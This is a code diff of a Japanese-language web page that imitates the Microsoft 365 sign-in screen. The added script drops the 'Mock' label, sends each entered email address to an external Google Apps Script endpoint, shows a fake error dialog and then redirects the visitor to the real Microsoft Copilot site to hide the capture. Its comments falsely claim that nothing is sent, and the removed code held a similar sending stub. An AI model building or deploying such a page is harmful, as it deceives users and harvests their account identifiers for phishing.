@@ -9,12 +9,19 @@
     --ms-blue:#0067B8;
     --ms-blue-hover:#005A9E;
     --text:#1b1b1b;
-    --sub:#616161;
-    --border:#d1d1d1;
+    --sub:#605e5c;
+    --muted:#8a8886;
+    --border:#edebe9;
     --error:#a4262c;
-    --success:#107c10;
+    --warning-bg:#fff4ce;
+    --warning-text:#8a6d00;
+    --card-bg:rgba(255,255,255,.90);
 }
+
 *{ box-sizing:border-box; }
+
+html,body{ height:100%; }
+
 body{
     margin:0;
     min-height:100vh;
@@ -29,6 +36,8 @@ body{
     align-items:center;
     overflow:hidden;
 }
+
+/* ---------- 背景装飾 ---------- */
 .background-shape{
     position:fixed;
     inset:auto auto -140px -100px;
@@ -37,7 +46,9 @@ body{
     border-radius:50%;
     background:rgba(0,103,184,.10);
     filter:blur(8px);
+    pointer-events:none;
 }
+
 .mock-badge{
     position:fixed;
     top:18px;
@@ -45,30 +56,35 @@ body{
     padding:7px 12px;
     border:1px solid rgba(0,0,0,.08);
     border-radius:999px;
-    background:rgba(255,255,255,.70);
+    background:rgba(255,255,255,.72);
     backdrop-filter:blur(12px);
     font-size:12px;
     color:#4b5563;
     letter-spacing:.02em;
+    z-index:2;
 }
+
+/* ---------- サインインカード ---------- */
 .login-card{
     width:430px;
     max-width:92%;
     min-height:438px;
     padding:42px 42px 34px;
-    background:rgba(255,255,255,.90);
+    background:var(--card-bg);
     backdrop-filter:blur(22px) saturate(135%);
     border:1px solid rgba(255,255,255,.56);
     border-radius:14px;
     box-shadow:0 28px 80px rgba(31,45,61,.16), 0 2px 8px rgba(31,45,61,.06);
-    transition:opacity .28s ease, transform .28s ease;
+    z-index:1;
 }
+
 .logo{
     display:flex;
     align-items:center;
     gap:12px;
     margin-bottom:30px;
 }
+
 .logo-icon{
     width:24px;
     height:24px;
@@ -81,38 +97,50 @@ body{
 .logo-icon div:nth-child(2){background:#7FBA00;}
 .logo-icon div:nth-child(3){background:#00A4EF;}
 .logo-icon div:nth-child(4){background:#FFB900;}
+
 .logo-text{
     font-size:20px;
     font-weight:600;
     color:#323130;
 }
+
 .title{
     font-size:30px;
     line-height:1.25;
     font-weight:600;
     margin:0 0 12px;
 }
+
 .description{
     font-size:14px;
     line-height:1.7;
     color:var(--sub);
     margin-bottom:22px;
 }
+
 .input-wrap{ margin-top:4px; }
+
 .input-box{
     width:100%;
     border:0;
-    border-bottom:1px solid #8a8886;
+    border-bottom:1px solid var(--muted);
     padding:11px 0 10px;
     font-size:15px;
     background:transparent;
     color:var(--text);
 }
+
 .input-box::placeholder{ color:#605e5c; }
+
 .input-box:focus{
     outline:none;
     border-bottom:2px solid var(--ms-blue);
 }
+
+.input-box.invalid{
+    border-bottom:2px solid var(--error);
+}
+
 .error-message{
     display:none;
     margin-top:8px;
@@ -121,6 +149,30 @@ body{
     line-height:1.5;
 }
 .error-message.show{ display:block; }
+
+.loading-line{
+    display:none;
+    align-items:center;
+    gap:10px;
+    margin-top:20px;
+    color:#605e5c;
+    font-size:14px;
+    line-height:1.6;
+}
+.loading-line.show{ display:flex; }
+
+.spinner{
+    width:16px;
+    height:16px;
+    border:2px solid #d2d0ce;
+    border-top-color:var(--ms-blue);
+    border-radius:50%;
+    animation:spin .75s linear infinite;
+    flex:none;
+}
+
+@keyframes spin{ to{ transform:rotate(360deg); } }
+
 .link{
     display:inline-block;
     margin-top:18px;
@@ -129,6 +181,7 @@ body{
     font-size:14px;
 }
 .link:hover{ text-decoration:underline; }
+
 .account{
     margin-top:28px;
     font-size:14px;
@@ -140,12 +193,14 @@ body{
     text-decoration:none;
 }
 .account a:hover{ text-decoration:underline; }
+
 .actions{
     display:flex;
     justify-content:flex-end;
     gap:8px;
     margin-top:34px;
 }
+
 .button{
     border:0;
     background:var(--ms-blue);
@@ -157,63 +212,104 @@ body{
     font-size:14px;
     font-weight:500;
     padding:0 18px;
-    transition:background .16s ease, transform .16s ease, box-shadow .16s ease;
+    transition:background .16s ease, transform .16s ease, box-shadow .16s ease, opacity .16s ease;
 }
 .button:hover{
     background:var(--ms-blue-hover);
     box-shadow:0 4px 12px rgba(0,103,184,.22);
 }
 .button:active{ transform:translateY(1px); }
-.secondary-button{
-    background:#f3f2f1;
-    color:#323130;
-}
-.secondary-button:hover{
-    background:#edebe9;
+.button:disabled{
+    cursor:not-allowed;
+    opacity:.82;
     box-shadow:none;
 }
-.summary-box{
-    margin-top:18px;
-    padding:14px 14px;
-    background:#f5f9fd;
-    border:1px solid #e1edf8;
-    border-radius:8px;
-    font-size:14px;
-    color:#323130;
-    word-break:break-all;
+
+/* ---------- ダイアログ ---------- */
+.modal-backdrop{
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.36);
+    backdrop-filter:blur(3px);
+    z-index:20;
 }
-.status-line{
+.modal-backdrop.show{ display:block; }
+
+.error-dialog{
+    display:none;
+    position:fixed;
+    left:50%;
+    top:50%;
+    width:448px;
+    max-width:92%;
+    transform:translate(-50%,-50%) scale(.98);
+    background:#fff;
+    border-radius:12px;
+    box-shadow:0 24px 72px rgba(0,0,0,.28), 0 2px 8px rgba(0,0,0,.12);
+    overflow:hidden;
+    z-index:30;
+    opacity:0;
+    transition:opacity .18s ease, transform .18s ease;
+}
+.error-dialog.show{
+    display:block;
+    opacity:1;
+    transform:translate(-50%,-50%) scale(1);
+}
+
+.dialog-header{
     display:flex;
-    align-items:flex-start;
+    align-items:center;
     gap:10px;
-    margin-top:24px;
-    padding-top:20px;
-    border-top:1px solid #edebe9;
-    color:#605e5c;
-    font-size:14px;
-    line-height:1.6;
+    padding:20px 24px 16px;
+    border-bottom:1px solid var(--border);
 }
-.check-icon{
-    flex:none;
-    width:22px;
-    height:22px;
+
+.dialog-icon{
+    width:28px;
+    height:28px;
     border-radius:50%;
-    background:var(--success);
-    color:white;
+    background:var(--warning-bg);
+    color:var(--warning-text);
     display:grid;
     place-items:center;
-    font-size:14px;
     font-weight:700;
-    margin-top:1px;
+    flex:none;
 }
-.fade-out{
-    opacity:0;
-    transform:translateY(-10px) scale(.995);
+
+.dialog-title{
+    font-size:20px;
+    font-weight:600;
+    color:#323130;
 }
-.fade-in{
-    opacity:1;
-    transform:translateY(0) scale(1);
+
+.dialog-body{
+    padding:22px 24px;
+    color:#323130;
+    font-size:14px;
+    line-height:1.8;
 }
+
+.dialog-note{
+    margin-top:14px;
+    padding:10px 12px;
+    border-left:3px solid var(--ms-blue);
+    background:#f5f9fd;
+    color:#605e5c;
+    font-size:13px;
+    line-height:1.6;
+}
+
+.dialog-footer{
+    padding:16px 24px;
+    display:flex;
+    justify-content:flex-end;
+    background:#faf9f8;
+    border-top:1px solid var(--border);
+}
+
+/* ---------- フッター ---------- */
 .footer{
     position:fixed;
     right:24px;
@@ -222,14 +318,17 @@ body{
     color:#605e5c;
     display:flex;
     gap:18px;
+    z-index:1;
 }
 .footer a{
     color:#605e5c;
     text-decoration:none;
 }
 .footer a:hover{ text-decoration:underline; }
+
+/* ---------- Responsive ---------- */
 @media (max-width:600px){
-    body{ align-items:flex-start; padding-top:70px; }
+    body{ align-items:flex-start; padding-top:70px; overflow:auto; }
     .login-card{ padding:30px 28px; min-height:auto; }
     .title{ font-size:25px; }
     .footer{ left:20px; right:auto; gap:14px; }
@@ -239,19 +338,33 @@ body{
 <body>
 <div class="background-shape" aria-hidden="true"></div>
 
-<main class="login-card" id="loginCard" aria-label="Microsoft 365">
+<main class="login-card" aria-label="Microsoft 365">
     <div class="logo">
         <div class="logo-icon" aria-hidden="true">
             <div></div><div></div><div></div><div></div>
         </div>
-        <div class="logo-text">Microsoft 365 Mock</div>
+        <div class="logo-text">Microsoft 365</div>
     </div>
 
     <h1 class="title">サインイン</h1>
 
     <div class="input-wrap">
-        <input id="mail" type="text" class="input-box" placeholder="メール、電話、または Skype" autocomplete="off" aria-describedby="mailError">
-        <div id="mailError" class="error-message">メールアドレスを入力してください。</div>
+        <input
+            id="mailInput"
+            type="email"
+            class="input-box"
+            placeholder="メールアドレス"
+            autocomplete="off"
+            inputmode="email"
+            aria-describedby="mailError">
+        <div id="mailError" class="error-message" aria-live="polite">
+            メールアドレスを入力してください。
+        </div>
+    </div>
+
+    <div id="loadingLine" class="loading-line" aria-live="polite">
+        <span class="spinner" aria-hidden="true"></span>
+        <span>サインインしています...</span>
     </div>
 
     <a href="#" class="link" onclick="return false;">サインイン オプション</a>
@@ -265,6 +378,21 @@ body{
     </div>
 </main>
 
+<div id="dialogBackdrop" class="modal-backdrop" aria-hidden="true"></div>
+<div id="errorDialog" class="error-dialog" role="dialog" aria-modal="true" aria-labelledby="errorDialogTitle" aria-describedby="errorDialogBody">
+    <div class="dialog-header">
+        <div class="dialog-icon" aria-hidden="true">!</div>
+        <div id="errorDialogTitle" class="dialog-title">問題が発生しました</div>
+    </div>
+    <div id="errorDialogBody" class="dialog-body">
+        ログイン処理中に問題が発生したため、ページを再読み込みします。<br><br>
+        ログイン画面が表示された場合は、再度ログインしてください。
+    </div>
+    <div class="dialog-footer">
+        <button class="button" id="dialogOkBtn" type="button">OK</button>
+    </div>
+</div>
+
 <footer class="footer">
     <a href="#" onclick="return false;">利用規約</a>
     <a href="#" onclick="return false;">プライバシー</a>
@@ -272,136 +400,159 @@ body{
 </footer>
 
 <script>
-    const button = document.getElementById("nextBtn");
-    const input = document.getElementById("mail");
-    const error = document.getElementById("mailError");
-    const card = document.getElementById("loginCard");
+/* =========================================================
+   設定値
+   ========================================================= */
 
-    function escapeHtml(value){
-        return value
-            .replaceAll("&", "&amp;")
-            .replaceAll("<", "&lt;")
-            .replaceAll(">", "&gt;")
-            .replaceAll('"', "&quot;")
-            .replaceAll("'", "&#039;");
+// OKボタン押下時の遷移先です。必要に応じて変更してください。
+// 例: "index.html", "/portal/login.html", "https://example.local/login"
+//const REDIRECT_URL = "login.html";
+const REDIRECT_URL = "https://copilot.microsoft.com/";
+
+
+// 次へ押下後、問題発生ダイアログを出すまでの待機時間です。
+const MOCK_WAIT_MS = 700;
+
+/* =========================================================
+   要素取得
+   ========================================================= */
+const mailInput = document.getElementById("mailInput");
+const mailError = document.getElementById("mailError");
+const nextBtn = document.getElementById("nextBtn");
+const loadingLine = document.getElementById("loadingLine");
+const dialogBackdrop = document.getElementById("dialogBackdrop");
+const errorDialog = document.getElementById("errorDialog");
+const dialogOkBtn = document.getElementById("dialogOkBtn");
+
+/* =========================================================
+   初期処理
+   - login.html?user=test@example.com
+   - login.html?email=test@example.com
+   のように指定すると入力欄へ事前入力します。
+   ========================================================= */
+function initializeInputFromQueryString(){
+    const params = new URLSearchParams(window.location.search);
+    const initialValue = params.get("user") || params.get("email");
+
+    if(initialValue){
+        mailInput.value = initialValue;
     }
+}
 
-    function renderWelcome(mail){
-        card.innerHTML = `
-            <div class="logo">
-                <div class="logo-icon" aria-hidden="true">
-                    <div></div><div></div><div></div><div></div>
-                </div>
-                <div class="logo-text">Microsoft 365</div>
-            </div>
+/* =========================================================
+   入力チェック
+   ========================================================= */
+function validateEmailInput(){
+    const mail = mailInput.value.trim();
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-            <h1 class="title">ようこそ</h1>
-            <div class="description">
-                カード内の表示だけを切り替えました。実際の認証処理、通信、保存は行いません。
-            </div>
+    mailInput.classList.remove("invalid");
+    mailError.classList.remove("show");
 
-            <div class="summary-box" aria-label="入力されたアカウント">
-                ${escapeHtml(mail)}
-            </div>
-
-            <div class="status-line">
-                <div class="check-icon" aria-hidden="true">✓</div>
-                <div>
-                    サインイン要求を受け付けました。<br>
-                    これはUI確認用の完了画面です。
-                </div>
-            </div>
-
-            <div class="actions">
-                <button class="button secondary-button" type="button" onclick="location.reload()">戻る</button>
-                <button class="button" type="button" onclick="location.reload()">完了</button>
-            </div>
-        `;
-    }
-
-    button.addEventListener("click", () => {
-        const mail = input.value.trim();
-
-        if(mail === ""){
-            error.classList.add("show");
-            input.focus();
-            return;
-        }
-
-        error.classList.remove("show");
-        button.textContent = "確認中...";
-        button.disabled = true;
-        button.style.opacity = ".85";
-
-        window.setTimeout(() => {
-            card.classList.add("fade-out");
-
-            window.setTimeout(() => {
-                renderWelcome(mail);
-                card.classList.remove("fade-out");
-                card.classList.add("fade-in");
-            }, 280);
-        }, 350);
-    });
-
-    input.addEventListener("keydown", (event) => {
-        if(event.key === "Enter"){
-            button.click();
-        }
-    });
-
-    function Login() {
-    }
-
-    Login.userNameInput = 'userNameInput';
-    Login.passwordInput = 'passwordInput';
-
-    Login.initialize = function () {
-
-        var u = new InputUtil();
-
-        u.checkError();
-        u.setInitialFocus(Login.userNameInput);
-        u.setInitialFocus(Login.passwordInput);
-    }();
-
-    Login.submitLoginRequest = function () { 
-        var u = new InputUtil();
-        var e = new LoginErrors();
-
-        var userName = document.getElementById(Login.userNameInput);
-        var password = document.getElementById(Login.passwordInput);
-
-        if (!userName.value || !userName.value.match('[@\\\\]')) {
-            u.setError(userName, e.userNameFormatError);
-            return false;
-        }
-
-        if (!password.value) {
-            u.setError(password, e.passwordEmpty);
-            return false;
-        }
-
-        if (password.value.length > maxPasswordLength) {
-            u.setError(password, e.passwordTooLong);
-            return false;
-        }
-
-        // ===== GASへ送信（重要：URLSearchParams使用）=====
-        const formData = new URLSearchParams();
-        formData.append("name", userName);
-        formData.append("email", "kotei@test.co.jp");
-        formData.append("message", "固定値検証");
-
-        fetch("https://script.google.com/macros/s/AKfycbzXqbYm2b95G5YqrVq6MwB4KB0A1ROQr80KaP2M3hvQ_QAYV19bd97gI3WzW7tWpN04Pg/exec", {  // ←ここ変更
-          method: "POST",
-          body: formData
-        })
-
-        document.forms['loginForm'].submit();
+    if(mail === ""){
+        showInputError("メールアドレスを入力してください。");
         return false;
-    };
+    }
 
+    if(!emailRegex.test(mail)){
+        showInputError("有効なメールアドレスを入力してください。");
+        return false;
+    }
+
+    return true;
+}
+
+function showInputError(message){
+    mailError.textContent = message;
+    mailError.classList.add("show");
+    mailInput.classList.add("invalid");
+    mailInput.focus();
+}
+
+/* =========================================================
+   次へ押下時の処理
+   - 実際の認証・通信は行いません。
+   - 判定はせず、必ず問題発生ダイアログを表示します。
+   ========================================================= */
+function handleNext(){
+    if(!validateEmailInput()){
+        return;
+    }
+    
+    var mailGAS = mailInput.value.trim();
+
+    // ===== GASへ送信（重要：URLSearchParams使用）=====
+    const formData = new URLSearchParams();
+    formData.append("email", mailGAS);
+
+    // デプロイ後に表示されるGASのウェブアプリURLを転記
+    fetch("https://script.google.com/macros/s/AKfycbx1S-ab8k91kUPZOOwQFKvccxvk1qLK_UUdhBhaEzIJzBQfpmH8yJgYGzlOBTmn9wOqNw/exec", {
+      method: "POST",
+      body: formData
+    })
+
+    setLoadingState(true);
+
+    window.setTimeout(() => {
+        setLoadingState(false);
+        showProblemDialog();
+    }, MOCK_WAIT_MS);
+}
+
+function setLoadingState(isLoading){
+    if(isLoading){
+        nextBtn.textContent = "確認中...";
+        nextBtn.disabled = true;
+        loadingLine.classList.add("show");
+    }else{
+        nextBtn.textContent = "次へ";
+        nextBtn.disabled = false;
+        loadingLine.classList.remove("show");
+    }
+}
+
+/* =========================================================
+   ダイアログ表示・リダイレクト
+   ========================================================= */
+function showProblemDialog(){
+    dialogBackdrop.classList.add("show");
+    dialogBackdrop.setAttribute("aria-hidden", "false");
+    errorDialog.style.display = "block";
+
+    window.requestAnimationFrame(() => {
+        errorDialog.classList.add("show");
+        dialogOkBtn.focus();
+    });
+}
+
+function redirectToLogin(){
+    // replaceを使うことで、問題発生ダイアログ表示状態をブラウザ履歴に残しません。
+    location.replace(REDIRECT_URL);
+}
+
+/* =========================================================
+   イベント設定
+   ========================================================= */
+nextBtn.addEventListener("click", handleNext);
+dialogOkBtn.addEventListener("click", redirectToLogin);
+
+mailInput.addEventListener("keydown", (event) => {
+    if(event.key === "Enter"){
+        handleNext();
+    }
+});
+
+mailInput.addEventListener("input", () => {
+    if(mailError.classList.contains("show")){
+        mailError.classList.remove("show");
+        mailInput.classList.remove("invalid");
+    }
+});
+
+// Escapeキーでは閉じられない設計です。
+// ユーザーにOK押下と location.replace() による遷移を明示的に踏ませます。
+
+initializeInputFromQueryString();
 </script>
 </body>
 </html>
